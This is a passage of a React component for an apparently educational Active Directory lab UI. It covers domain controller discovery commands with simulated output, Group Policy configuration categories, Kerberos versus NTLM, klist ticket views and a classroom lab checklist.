                <span className="text-xs font-mono uppercase text-slate-400 font-bold">
                  Interactive DC Discovery Console:
                </span>
                <span className="text-[10px] font-mono text-cyan-400 bg-cyan-950 px-2 py-0.5 rounded border border-cyan-800">
                  Try commands below
                </span>
              </div>

              <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 mb-3">
                {[
                  'nltest /dsgetdc:corp.example',
                  'nslookup -type=srv _ldap._tcp.dc._msdcs.corp.example',
                  'echo %LOGONSERVER%',
                  'Get-ADDomainController -Filter *'
                ].map((cmd) => (
                  <button
                    key={cmd}
                    onClick={() => setActiveDcCmd(cmd)}
                    className={`text-left p-2 rounded-lg border text-[11px] font-mono transition cursor-pointer ${
                      activeDcCmd === cmd
                        ? 'border-cyan-500 bg-cyan-950 text-cyan-200'
                        : 'border-slate-800 bg-slate-950 text-slate-400 hover:border-slate-700'
                    }`}
                  >
                    <code className="truncate block">{cmd}</code>
                  </button>
                ))}
              </div>

              {/* Terminal View */}
              <div className="p-4 rounded-xl bg-black border border-slate-800 font-mono text-xs">
                <div className="flex items-center gap-2 pb-2 mb-2 border-b border-slate-800 text-slate-500 text-[10px]">
                  <Terminal className="w-3.5 h-3.5 text-cyan-400" />
                  <span>C:\\Windows\\System32\\cmd.exe (or powershell.exe)</span>
                </div>
                <div className="text-cyan-400 mb-2">C:\Users\Admin&gt; {activeDcCmd}</div>
                <pre className="text-slate-300 text-[11px] whitespace-pre-wrap leading-relaxed">
                  {activeDcCmd === 'nltest /dsgetdc:corp.example' &&
`           DC: \\\\DC01.corp.example
      Address: \\\\192.168.56.10
     Dom Guid: c8d4e120-2b10-4f90-8e10-908bc21008ab
     Dom Name: corp.example
  Forest Name: corp.example
 Dc Site Name: Default-First-Site-Name
Our Site Name: Default-First-Site-Name
        Flags: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_DC DNS_DOMAIN DNS_FOREST CLOSE_SITE FULL_SECRET WS 0x371cf
The command completed successfully.`}

                  {activeDcCmd === 'nslookup -type=srv _ldap._tcp.dc._msdcs.corp.example' &&
`Server:  dns01.corp.example
Address:  192.168.56.1

_ldap._tcp.dc._msdcs.corp.example SRV service location:
          priority       = 0
          weight         = 100
          port           = 389
          svr hostname   = dc01.corp.example
dc01.corp.example internet address = 192.168.56.10`}

                  {activeDcCmd === 'echo %LOGONSERVER%' &&
`\\\\DC01`}

                  {activeDcCmd === 'Get-ADDomainController -Filter *' &&
`Domain                 : corp.example
Forest                 : corp.example
HostName               : DC01.corp.example
IPv4Address            : 192.168.56.10
IsGlobalCatalog        : True
IsReadOnly             : False
Name                   : DC01
OperatingSystem        : Windows Server 2022 Datacenter
Site                   : Default-First-Site-Name`}
                </pre>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ============================================================ */}
      {/* SECTION 3: GROUP POLICY (GPO) STUDIO */}
      {/* ============================================================ */}
      {activeSection === 'gpo' && (
        <div className="space-y-6 animate-fadeIn">
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl">
            <div className="pb-4 border-b border-slate-800">
              <h2 className="text-base font-bold text-white flex items-center gap-2">
                <Sliders className="w-5 h-5 text-emerald-400" />
                Group Policy Management (GPO Studio)
              </h2>
              <p className="text-xs text-slate-400 mt-0.5">
                Centralized management engine for configuring operating system settings, security restrictions, and software deployment.
              </p>
            </div>

            {/* ============================================================ */}
            {/* CLASSIFICATION CONTAINER: COMPUTER CONFIGURATION VS USER CONFIGURATION */}
            {/* ============================================================ */}
            <div className="my-5 p-5 rounded-2xl bg-gradient-to-b from-slate-950 to-[#070b14] border border-slate-800 shadow-2xl space-y-5">
              {/* Container Header */}
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-4 border-b border-slate-800">
                <div>
                  <div className="flex items-center gap-2 mb-1">
                    <span className="px-2.5 py-0.5 rounded-full text-[10px] font-mono font-bold bg-emerald-950 border border-emerald-700 text-emerald-300">
                      GPO ARCHITECTURE & TAXONOMY
                    </span>
                    <span className="px-2.5 py-0.5 rounded-full text-[10px] font-mono font-bold bg-cyan-950 border border-cyan-700 text-cyan-300">
                      DUAL-SCOPE ENGINE
                    </span>
                  </div>
                  <h3 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                    <Sliders className="w-5 h-5 text-emerald-400" />
                    Group Policy Configuration Categories
                  </h3>
                  <p className="text-xs text-slate-300 mt-1 font-sans">
                    <strong>A GPO is a collection of policy settings.</strong> There are two main configuration categories:
                  </p>
                </div>

                {/* Filter Switcher */}
                <div className="flex items-center bg-slate-900 p-1 rounded-xl border border-slate-800 text-xs font-mono self-start sm:self-auto">
                  <button
                    onClick={() => setGpoCategoryFilter('all')}
                    className={`px-3 py-1.5 rounded-lg transition cursor-pointer font-bold ${
                      gpoCategoryFilter === 'all'
                        ? 'bg-emerald-600 text-black shadow-md'
                        : 'text-slate-400 hover:text-white'
                    }`}
                  >
                    All Categories
                  </button>
                  <button
                    onClick={() => setGpoCategoryFilter('computer')}
                    className={`px-3 py-1.5 rounded-lg transition cursor-pointer font-bold ${
                      gpoCategoryFilter === 'computer'
                        ? 'bg-blue-600 text-white shadow-md'
                        : 'text-slate-400 hover:text-white'
                    }`}
                  >
                    Computer Config
                  </button>
                  <button
                    onClick={() => setGpoCategoryFilter('user')}
                    className={`px-3 py-1.5 rounded-lg transition cursor-pointer font-bold ${
                      gpoCategoryFilter === 'user'
                        ? 'bg-purple-600 text-white shadow-md'
                        : 'text-slate-400 hover:text-white'
                    }`}
                  >
                    User Config
                  </button>
                </div>
              </div>

              {/* Side-by-Side Classification Cards */}
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
                {/* 1. Computer Configuration Card */}
                {(gpoCategoryFilter === 'all' || gpoCategoryFilter === 'computer') && (
                  <div className="p-4 sm:p-5 rounded-xl bg-slate-900/90 border border-blue-800/60 shadow-xl space-y-4 flex flex-col justify-between">
                    <div className="space-y-3">
                      <div className="flex items-start justify-between gap-2 pb-3 border-b border-slate-800">
                        <div>
                          <div className="flex items-center gap-2 mb-1">
                            <span className="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-blue-950 border border-blue-700 text-blue-300">
                              CATEGORY 1
                            </span>
                            <span className="px-2 py-0.5 rounded text-[10px] font-mono text-slate-400 bg-slate-950 border border-slate-800">
                              BOOT-TIME EXECUTION
                            </span>
                          </div>
                          <h4 className="text-base font-bold text-white flex items-center gap-2">
                            <Laptop className="w-5 h-5 text-blue-400" />
                            1. Computer Configuration
                          </h4>
                        </div>
                        <span className="text-[10px] font-mono px-2.5 py-1 rounded-md bg-blue-950/80 border border-blue-600/50 text-blue-200 font-bold shrink-0">
                          HKLM
                        </span>
                      </div>

                      <div className="p-3 rounded-lg bg-blue-950/20 border border-blue-900/40 text-xs font-sans text-blue-200 leading-relaxed">
                        <strong>Settings applied to computers.</strong> Applied during operating system boot prior to user login. Governs machine-wide operating system parameters, hardware restrictions, and security policies regardless of which user logs in.
                      </div>

                      {/* Examples List */}
                      <div>
                        <span className="text-[11px] font-mono uppercase text-slate-400 font-bold block mb-2">
                          Examples (Click to Inspect Configuration Details):
                        </span>
                        <div className="space-y-2">
                          {GPO_COMPUTER_EXAMPLES.map((ex, idx) => {
                            const isSelected = selectedGpoDetail?.name === ex.name;
                            const IconComp = ex.icon;
                            return (
                              <div
                                key={idx}
                                onClick={() => setSelectedGpoDetail(isSelected ? null : ex)}
                                className={`p-3 rounded-lg border transition-all cursor-pointer select-none ${
                                  isSelected
                                    ? 'border-blue-400 bg-blue-950/60 shadow-md shadow-blue-950/40 ring-1 ring-blue-400'
                                    : 'border-slate-800 bg-slate-950/80 hover:border-slate-700 hover:bg-slate-950'
                                }`}
                              >
                                <div className="flex items-center justify-between">
                                  <div className="flex items-center gap-2.5">
                                    <div className="w-7 h-7 rounded-md bg-blue-950 border border-blue-800 flex items-center justify-center text-blue-400 shrink-0">
                                      <IconComp className="w-4 h-4" />
                                    </div>
                                    <div>
                                      <strong className="text-xs text-white block">• {ex.name}</strong>
                                      <span className="text-[10px] font-mono text-slate-400">{ex.scopeSummary}</span>
                                    </div>
                                  </div>
                                  <ChevronRight className={`w-4 h-4 transition-transform ${isSelected ? 'rotate-90 text-blue-400' : 'text-slate-600'}`} />
                                </div>

                                {isSelected && (
                                  <div className="mt-3 pt-2.5 border-t border-slate-800 text-[11px] space-y-2 animate-fadeIn">
                                    <p className="text-slate-300 font-sans leading-relaxed">{ex.desc}</p>
                                    <div className="p-2 rounded bg-black/70 border border-slate-800 font-mono text-[10px] text-blue-300 space-y-1">
                                      <div><strong className="text-slate-500">GPMC Path:</strong> <code>{ex.path}</code></div>
                                      <div><strong className="text-slate-500">Registry Hive:</strong> <code>{ex.regKey}</code></div>
                                    </div>
                                    <div className="text-slate-400 text-[10px] font-sans">
                                      <strong className="text-blue-300">Security & Operational Purpose:</strong> {ex.practicalUse}
                                    </div>
                                  </div>
                                )}
                              </div>
                            );
                          })}
                        </div>
                      </div>
                    </div>

                    <div className="pt-3 border-t border-slate-800/80 flex items-center justify-between text-[10px] font-mono text-slate-400">
                      <span>Target Hive: HKEY_LOCAL_MACHINE</span>
                      <span className="text-blue-400 font-bold">Applies to Machine Account</span>
                    </div>
                  </div>
                )}

                {/* 2. User Configuration Card */}
                {(gpoCategoryFilter === 'all' || gpoCategoryFilter === 'user') && (
                  <div className="p-4 sm:p-5 rounded-xl bg-slate-900/90 border border-purple-800/60 shadow-xl space-y-4 flex flex-col justify-between">
                    <div className="space-y-3">
                      <div className="flex items-start justify-between gap-2 pb-3 border-b border-slate-800">
                        <div>
                          <div className="flex items-center gap-2 mb-1">
                            <span className="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-purple-950 border border-purple-700 text-purple-300">
                              CATEGORY 2
                            </span>
                            <span className="px-2 py-0.5 rounded text-[10px] font-mono text-slate-400 bg-slate-950 border border-slate-800">
                              LOGON-TIME EXECUTION
                            </span>
                          </div>
                          <h4 className="text-base font-bold text-white flex items-center gap-2">
                            <Users className="w-5 h-5 text-purple-400" />
                            2. User Configuration
                          </h4>
                        </div>
                        <span className="text-[10px] font-mono px-2.5 py-1 rounded-md bg-purple-950/80 border border-purple-600/50 text-purple-200 font-bold shrink-0">
                          HKCU
                        </span>
                      </div>

                      <div className="p-3 rounded-lg bg-purple-950/20 border border-purple-900/40 text-xs font-sans text-purple-200 leading-relaxed">
                        <strong>Settings applied to users.</strong> Applied when the user logs in after entering domain credentials. Governs user environment, desktop lockdown, profile folder redirection, and logon scripts across any domain workstation they access.
                      </div>

                      {/* Examples List */}
                      <div>
                        <span className="text-[11px] font-mono uppercase text-slate-400 font-bold block mb-2">
                          Examples (Click to Inspect Configuration Details):
                        </span>
                        <div className="space-y-2">
                          {GPO_USER_EXAMPLES.map((ex, idx) => {
                            const isSelected = selectedGpoDetail?.name === ex.name;
                            const IconComp = ex.icon;
                            return (
                              <div
                                key={idx}
                                onClick={() => setSelectedGpoDetail(isSelected ? null : ex)}
                                className={`p-3 rounded-lg border transition-all cursor-pointer select-none ${
                                  isSelected
                                    ? 'border-purple-400 bg-purple-950/60 shadow-md shadow-purple-950/40 ring-1 ring-purple-400'
                                    : 'border-slate-800 bg-slate-950/80 hover:border-slate-700 hover:bg-slate-950'
                                }`}
                              >
                                <div className="flex items-center justify-between">
                                  <div className="flex items-center gap-2.5">
                                    <div className="w-7 h-7 rounded-md bg-purple-950 border border-purple-800 flex items-center justify-center text-purple-400 shrink-0">
                                      <IconComp className="w-4 h-4" />
                                    </div>
                                    <div>
                                      <strong className="text-xs text-white block">• {ex.name}</strong>
                                      <span className="text-[10px] font-mono text-slate-400">{ex.scopeSummary}</span>
                                    </div>
                                  </div>
                                  <ChevronRight className={`w-4 h-4 transition-transform ${isSelected ? 'rotate-90 text-purple-400' : 'text-slate-600'}`} />
                                </div>

                                {isSelected && (
                                  <div className="mt-3 pt-2.5 border-t border-slate-800 text-[11px] space-y-2 animate-fadeIn">
                                    <p className="text-slate-300 font-sans leading-relaxed">{ex.desc}</p>
                                    <div className="p-2 rounded bg-black/70 border border-slate-800 font-mono text-[10px] text-purple-300 space-y-1">
                                      <div><strong className="text-slate-500">GPMC Path:</strong> <code>{ex.path}</code></div>
                                      <div><strong className="text-slate-500">Registry Hive:</strong> <code>{ex.regKey}</code></div>
                                    </div>
                                    <div className="text-slate-400 text-[10px] font-sans">
                                      <strong className="text-purple-300">Security & Operational Purpose:</strong> {ex.practicalUse}
                                    </div>
                                  </div>
                                )}
                              </div>
                            );
                          })}
                        </div>
                      </div>
                    </div>

                    <div className="pt-3 border-t border-slate-800/80 flex items-center justify-between text-[10px] font-mono text-slate-400">
                      <span>Target Hive: HKEY_CURRENT_USER</span>
                      <span className="text-purple-400 font-bold">Applies to User Principal</span>
                    </div>
                  </div>
                )}
              </div>

              {/* Comparison Matrix Summary Table */}
              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 font-mono text-xs overflow-x-auto">
                <span className="text-[11px] uppercase text-emerald-400 font-bold block mb-2">
                  ARCHITECTURAL COMPARISON: COMPUTER CONFIGURATION VS. USER CONFIGURATION
                </span>
                <table className="w-full text-left text-[11px] border-collapse">
                  <thead>
                    <tr className="border-b border-slate-800 text-slate-400">
                      <th className="py-2 pr-3">Feature</th>
                      <th className="py-2 px-3 text-blue-400">1. Computer Configuration</th>
                      <th className="py-2 pl-3 text-purple-400">2. User Configuration</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-900 text-slate-300">
                    <tr>
                      <td className="py-2 pr-3 font-bold text-slate-400">Applied To:</td>
                      <td className="py-2 px-3 text-blue-300">Computers (Machine Object)</td>
                      <td className="py-2 pl-3 text-purple-300">Users (User Principal Object)</td>
                    </tr>
                    <tr>
                      <td className="py-2 pr-3 font-bold text-slate-400">Execution Timing:</td>
                      <td className="py-2 px-3">System Boot / Startup (before login)</td>
                      <td className="py-2 pl-3">User Logon (after password input)</td>
                    </tr>
                    <tr>
                      <td className="py-2 pr-3 font-bold text-slate-400">Target Registry:</td>
                      <td className="py-2 px-3 font-mono text-cyan-300">HKEY_LOCAL_MACHINE (HKLM)</td>
                      <td className="py-2 pl-3 font-mono text-purple-300">HKEY_CURRENT_USER (HKCU)</td>
                    </tr>
                    <tr>
                      <td className="py-2 pr-3 font-bold text-slate-400">Scope of Effect:</td>
                      <td className="py-2 px-3">Affects all accounts on that physical PC</td>
                      <td className="py-2 pl-3">Follows the user across any domain workstation</td>
                    </tr>
                    <tr>
                      <td className="py-2 pr-3 font-bold text-slate-400">Standard Examples:</td>
                      <td className="py-2 px-3 text-slate-300">Windows Firewall, Defender settings, Security policies, Software deployment, System restrictions</td>
                      <td className="py-2 pl-3 text-slate-300">Control Panel restrictions, Desktop configuration, Start Menu settings, Folder redirection, Login scripts</td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>

            {/* LSDOU Hierarchy Diagram */}
            <div className="my-5 p-4 rounded-xl bg-slate-950 border border-slate-800 text-xs font-mono">
              <span className="text-emerald-400 font-bold block mb-2">
                GPO PROCESSING HIERARCHY (LSDOU ORDER):
              </span>
              <div className="flex flex-wrap items-center gap-2 text-[11px]">
                <span className="px-3 py-1 rounded bg-slate-900 border border-slate-700 text-slate-300">
                  1. <strong>L</strong>ocal Policy
                </span>
                <ChevronRight className="w-3.5 h-3.5 text-slate-600" />
                <span className="px-3 py-1 rounded bg-slate-900 border border-slate-700 text-slate-300">
                  2. <strong>S</strong>ite GPO
                </span>
                <ChevronRight className="w-3.5 h-3.5 text-slate-600" />
                <span className="px-3 py-1 rounded bg-slate-900 border border-slate-700 text-slate-300">
                  3. <strong>D</strong>omain GPO
                </span>
                <ChevronRight className="w-3.5 h-3.5 text-slate-600" />
                <span className="px-3 py-1 rounded bg-emerald-950 border border-emerald-500 text-emerald-300 font-bold">
                  4. <strong>O</strong>rganizational Unit (OU) GPO
                </span>
              </div>
              <p className="text-slate-400 font-sans text-[11px] mt-2">
                * Rule: Later applied policies override earlier ones, meaning OU policies take precedence over Domain policies, unless <strong>Enforced</strong> is configured.
              </p>
            </div>

            {/* Interactive Policy Configuration Engine */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-3">
                <span className="text-xs font-mono text-emerald-300 font-bold block">
                  CONFIGURED ENTERPRISE GPOS:
                </span>

                <div className="space-y-2 text-xs font-mono">
                  {/* Policy 1 */}
                  <div
                    onClick={() => setGpoSettings((prev) => ({ ...prev, controlPanel: !prev.controlPanel }))}
                    className={`p-3 rounded-lg border flex items-center justify-between cursor-pointer transition ${
                      gpoSettings.controlPanel
                        ? 'border-emerald-500 bg-emerald-950/30 text-emerald-200'
                        : 'border-slate-800 bg-slate-900 text-slate-500'
                    }`}
                  >
                    <div>
                      <strong className="block text-[11px]">Prohibit Access to Control Panel & Settings</strong>
                      <span className="text-[10px] text-slate-400">User Configuration &gt; Admin Templates</span>
                    </div>
                    {gpoSettings.controlPanel ? (
                      <CheckSquare className="w-4 h-4 text-emerald-400 shrink-0" />
                    ) : (
                      <Square className="w-4 h-4 text-slate-600 shrink-0" />
                    )}
                  </div>

                  {/* Policy 2 */}
                  <div
                    onClick={() => setGpoSettings((prev) => ({ ...prev, usbBlock: !prev.usbBlock }))}
                    className={`p-3 rounded-lg border flex items-center justify-between cursor-pointer transition ${
                      gpoSettings.usbBlock
                        ? 'border-emerald-500 bg-emerald-950/30 text-emerald-200'
                        : 'border-slate-800 bg-slate-900 text-slate-500'
                    }`}
                  >
                    <div>
                      <strong className="block text-[11px]">Disable Removable USB Mass Storage</strong>
                      <span className="text-[10px] text-slate-400">Computer Configuration &gt; Removable Storage</span>
                    </div>
                    {gpoSettings.usbBlock ? (
                      <CheckSquare className="w-4 h-4 text-emerald-400 shrink-0" />
                    ) : (
                      <Square className="w-4 h-4 text-slate-600 shrink-0" />
                    )}
                  </div>

                  {/* Policy 3 */}
                  <div
                    onClick={() => setGpoSettings((prev) => ({ ...prev, passwordPolicy: !prev.passwordPolicy }))}
                    className={`p-3 rounded-lg border flex items-center justify-between cursor-pointer transition ${
                      gpoSettings.passwordPolicy
                        ? 'border-emerald-500 bg-emerald-950/30 text-emerald-200'
                        : 'border-slate-800 bg-slate-900 text-slate-500'
                    }`}
                  >
                    <div>
                      <strong className="block text-[11px]">Enforce 12-Char Password Complexity</strong>
                      <span className="text-[10px] text-slate-400">Domain &gt; Password Policy &gt; Length: 12</span>
                    </div>
                    {gpoSettings.passwordPolicy ? (
                      <CheckSquare className="w-4 h-4 text-emerald-400 shrink-0" />
                    ) : (
                      <Square className="w-4 h-4 text-slate-600 shrink-0" />
                    )}
                  </div>
                </div>

                <button
                  onClick={runGpUpdateSim}
                  className="w-full py-2.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-black font-bold text-xs transition cursor-pointer flex items-center justify-center gap-2"
                >
                  <Play className="w-4 h-4 fill-current" />
                  <span>Execute "gpupdate /force" Simulation</span>
                </button>
              </div>

              {/* Policy Enforcement Console */}
              <div className="p-4 rounded-xl bg-black border border-slate-800 font-mono text-xs">
                <div className="flex items-center justify-between pb-2 mb-2 border-b border-slate-800 text-slate-500 text-[10px]">
                  <span>RSOP / GPUPDATE LIVE OUTPUT</span>
                  <span className="text-emerald-400">gpresult /r</span>
                </div>
                <pre className="text-slate-300 text-[11px] whitespace-pre-wrap leading-relaxed">
                  {gpOutput || `Click "Execute gpupdate /force" to test policy compilation across client nodes.`}
                </pre>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ============================================================ */}
      {/* SECTION 4: AUTHENTICATION METHODS (KERBEROS & NTLM) */}
      {/* ============================================================ */}
      {activeSection === 'auth' && (
        <div className="space-y-6 animate-fadeIn">
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl">
            <div className="pb-4 border-b border-slate-800">
              <h2 className="text-base font-bold text-white flex items-center gap-2">
                <Key className="w-5 h-5 text-amber-400" />
                Windows Authentication Protocols (Kerberos vs NTLM)
              </h2>
              <p className="text-xs text-slate-400 mt-0.5">
                How identity is cryptographically proven across modern enterprise networks.
              </p>
            </div>

            {/* Comparison Cards */}
            <div className="my-5 grid grid-cols-1 md:grid-cols-2 gap-4 text-xs font-mono">
              <div className="p-4 rounded-xl bg-purple-950/30 border border-purple-800/60 space-y-2">
                <div className="flex items-center justify-between">
                  <span className="text-purple-300 font-bold text-sm">Kerberos (Default Active Directory)</span>
                  <span className="text-[10px] px-2 py-0.5 rounded bg-purple-900 text-purple-200">PORT 88</span>
                </div>
                <p className="text-slate-300 font-sans text-xs leading-relaxed">
                  Mutual authentication protocol using tickets issued by the Key Distribution Center (KDC). Passwords never cross the network.
                </p>
                <ul className="text-slate-400 text-[11px] space-y-1 list-disc list-inside">
                  <li>Ticket-Granting Ticket (TGT) issued by Authentication Service (AS)</li>
                  <li>Service Tickets (TGS) issued for target servers (CIFS, HTTP, SQL)</li>
                  <li>Fast, secure, supports mutual authentication and delegation</li>
                </ul>
              </div>

              <div className="p-4 rounded-xl bg-amber-950/30 border border-amber-800/60 space-y-2">
                <div className="flex items-center justify-between">
                  <span className="text-amber-300 font-bold text-sm">NTLM (NT LAN Manager - Legacy)</span>
                  <span className="text-[10px] px-2 py-0.5 rounded bg-amber-900 text-amber-200">CHALLENGE-RESPONSE</span>
                </div>
                <p className="text-slate-300 font-sans text-xs leading-relaxed">
                  Older challenge-response protocol used when IP addresses are targeted or non-domain devices communicate.
                </p>
                <ul className="text-slate-400 text-[11px] space-y-1 list-disc list-inside">
                  <li>Client sends Negotiate, Server sends Challenge, Client sends Response</li>
                  <li>Vulnerable to Pass-the-Hash and SMB Relay attacks</li>
                  <li>Organizations should audit and disable NTLM via Group Policy</li>
                </ul>
              </div>
            </div>

            {/* Interactive Kerberos Ticket Viewer (klist) */}
            <div className="p-5 rounded-xl bg-slate-950 border border-slate-800">
              <div className="flex items-center justify-between mb-4">
                <span className="text-xs font-mono uppercase text-amber-400 font-bold">
                  Interactive Ticket Viewer (klist inspection):
                </span>
                <div className="flex items-center gap-2">
                  <button
                    onClick={() => setKerbTicketView('tgt')}
                    className={`px-3 py-1 rounded text-xs font-mono transition cursor-pointer ${
                      kerbTicketView === 'tgt'
                        ? 'bg-purple-600 text-white font-bold'
                        : 'bg-slate-900 text-slate-400 hover:text-white'
                    }`}
                  >
                    Ticket Granting Ticket (TGT)
                  </button>
                  <button
                    onClick={() => setKerbTicketView('cifs')}
                    className={`px-3 py-1 rounded text-xs font-mono transition cursor-pointer ${
                      kerbTicketView === 'cifs'
                        ? 'bg-amber-600 text-white font-bold'
                        : 'bg-slate-900 text-slate-400 hover:text-white'
                    }`}
                  >
                    Service Ticket (CIFS)
                  </button>
                </div>
              </div>

              {/* Terminal Display */}
              <div className="p-4 rounded-xl bg-black border border-slate-800 font-mono text-xs text-slate-300">
                <div className="text-cyan-400 mb-2">C:\Users\alice&gt; klist</div>
                <pre className="text-slate-300 text-[11px] whitespace-pre-wrap leading-relaxed">
                  {kerbTicketView === 'tgt' &&
`Current LogonId is 0:0x4f21a

Cached Tickets: (1)

#0>     Client: alice @ CORP.EXAMPLE
        Server: krbtgt/CORP.EXAMPLE @ CORP.EXAMPLE
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent
        Start Time: 11/14/2026 09:00:00 (local)
        End Time:   11/14/2026 19:00:00 (local)
        Renew Time: 11/21/2026 09:00:00 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY`}

                  {kerbTicketView === 'cifs' &&
`Current LogonId is 0:0x4f21a

Cached Tickets: (2)

#1>     Client: alice @ CORP.EXAMPLE
        Server: cifs/FS01.corp.example @ CORP.EXAMPLE
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent
        Start Time: 11/14/2026 09:15:20 (local)
        End Time:   11/14/2026 19:00:00 (local)
        Renew Time: 11/21/2026 09:00:00 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x0`}
                </pre>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ============================================================ */}
      {/* SECTION 5: PRACTICAL SCENARIO - ABC TECHNOLOGIES */}
      {/* ============================================================ */}
      {activeSection === 'scenario' && (
        <div className="space-y-6 animate-fadeIn">
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl space-y-5">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-4 border-b border-slate-800">
              <div>
                <h2 className="text-base font-bold text-white flex items-center gap-2">
                  <Award className="w-5 h-5 text-cyan-400" />
                  Practical Enterprise Scenario: ABC Technologies
                </h2>
                <p className="text-xs text-slate-400 mt-0.5">
                  Complete hands-on classroom lab deploying enterprise AD DS architecture.
                </p>
              </div>
              <div className="text-xs font-mono px-3 py-1 rounded-full bg-cyan-950 border border-cyan-800 text-cyan-300 self-start sm:self-auto">
                Completed: {completedTasksCount} / 12 Tasks
              </div>
            </div>

            {/* Task Checklist */}
            <div className="space-y-2">
              <span className="text-xs font-mono uppercase text-slate-400 font-bold block">
                LAB IMPLEMENTATION CHECKLIST:
              </span>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-2 text-xs font-mono">
                {[
                  { id: 1, title: 'Install Windows Server 2022 on VM 2' },
                  { id: 2, title: 'Promote Server to Domain Controller (corp.example)' },
                  { id: 3, title: 'Create Organizational Units (HR, IT, Finance)' },
                  { id: 4, title: 'Create department security groups' },
                  { id: 5, title: 'Create domain user accounts' },
                  { id: 6, title: 'Add users to respective groups' },
                  { id: 7, title: 'Join Windows 11 Client to the domain' },
                  { id: 8, title: 'Create and link Group Policies' },
                  { id: 9, title: 'Restrict Control Panel access' },
                  { id: 10, title: 'Configure removable storage restrictions' },
                  { id: 11, title: 'Test Kerberos authentication (klist)' },
                  { id: 12, title: 'Investigate Windows Security events (4624/4768)' }
                ].map((t) => {
                  const isDone = !!scenarioTasks[t.id];
                  return (
                    <div
                      key={t.id}
                      onClick={() => toggleTask(t.id)}
                      className={`p-2.5 rounded-lg border flex items-center gap-2.5 transition cursor-pointer select-none ${
                        isDone
                          ? 'border-emerald-500 bg-emerald-950/40 text-emerald-200'
                          : 'border-slate-800 bg-slate-900 text-slate-400 hover:border-slate-700'
                      }`}
                    >
                      {isDone ? (
                        <CheckSquare className="w-4 h-4 text-emerald-400 shrink-0" />
                      ) : (
                        <Square className="w-4 h-4 text-slate-600 shrink-0" />
                      )}
                      <span className="text-[11px]">Task {t.id}: {t.title}</span>
                    </div>
                  );
                })}
              </div>
            </div>

            {/* Target Architecture Blueprint */}
            <div className="p-4 rounded-xl bg-black border border-slate-800 font-mono text-xs text-slate-300">
              <span className="text-cyan-400 font-bold block mb-2">TARGET ENTERPRISE ARCHITECTURE BLUEPRINT:</span>
              <pre className="text-slate-300 text-[11px] leading-relaxed">
{`Forest: corp.example
  |-- Domain Controller: DC01 (192.168.56.10)
  |-- Domain: corp.example
       |-- OU: HR          -> Users: hruser      | Groups: HR_Group
       |-- OU: IT          -> Users: ituser      | Groups: IT_Group
       |-- OU: Finance     -> Users: financeuser | Groups: Finance_Group
       |-- OU: Workstations -> Client: WIN11-PC01 (Joined to corp.example)`}
              </pre>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
